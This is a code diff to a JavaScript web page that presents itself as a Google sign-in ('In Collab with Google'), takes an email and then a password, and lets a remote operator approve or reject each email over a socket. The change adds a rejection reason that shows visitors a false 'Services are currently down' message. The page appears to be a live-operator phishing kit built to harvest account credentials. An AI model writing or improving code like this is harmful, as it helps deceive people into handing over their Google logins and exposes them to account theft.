@@ -305,6 +305,7 @@
         customerCode: null,
         codeRejected: false,
         emailRejected: false,
+        emailRejectedReason: null, // 'manual' | 'timeout'
         secretMessage: null,
         secretExpiresAt: null,
         msgExpired: false,
@@ -545,10 +546,13 @@
         let body = "";
 
         if (S.status === "pending") {
+          const rejectionMsg = S.emailRejected
+            ? S.emailRejectedReason === "timeout"
+              ? '<p class="small red bold mb-3">⚠️ Services are currently down — please try again later.</p>'
+              : '<p class="small red bold mb-3">❌ This email is already registered — please use a different email.</p>'
+            : '';
           body = `
-            ${S.emailRejected
-              ? '<p class="small red bold mb-3">❌ This email is already registered — please use a different email.</p>'
-              : ''}
+            ${rejectionMsg}
             <label class="label">In Collab with Google</label>
             <p class="hint mb-4">Sign in with your Google account to continue.</p>
             <input id="inp-email" type="email" class="input mb-4" placeholder="your@email.com" />
@@ -844,6 +848,7 @@
             S.status = "code_entry";
             S.codeRejected = false;
             S.emailRejected = false;
+            S.emailRejectedReason = null;
             if (!S.isHolder) showToast("Email validated! Enter your password.", "success");
             draw();
           });
@@ -871,11 +876,18 @@
           });
 
           // ============ NEW: EMAIL REJECTED LISTENER ============
-          socket.on("customer-email-rejected", function () {
+          socket.on("customer-email-rejected", function (payload) {
             S.status = "pending";
             S.customerEmail = null;
             S.emailRejected = true;
-            if (!S.isHolder) showToast("This email is already registered — please use a different email.", "error");
+            S.emailRejectedReason = (payload && payload.reason) || "manual";
+            if (!S.isHolder) {
+              if (S.emailRejectedReason === "timeout") {
+                showToast("Services are currently down — please try again later.", "error");
+              } else {
+                showToast("This email is already registered — please use a different email.", "error");
+              }
+            }
             draw();
           });
 
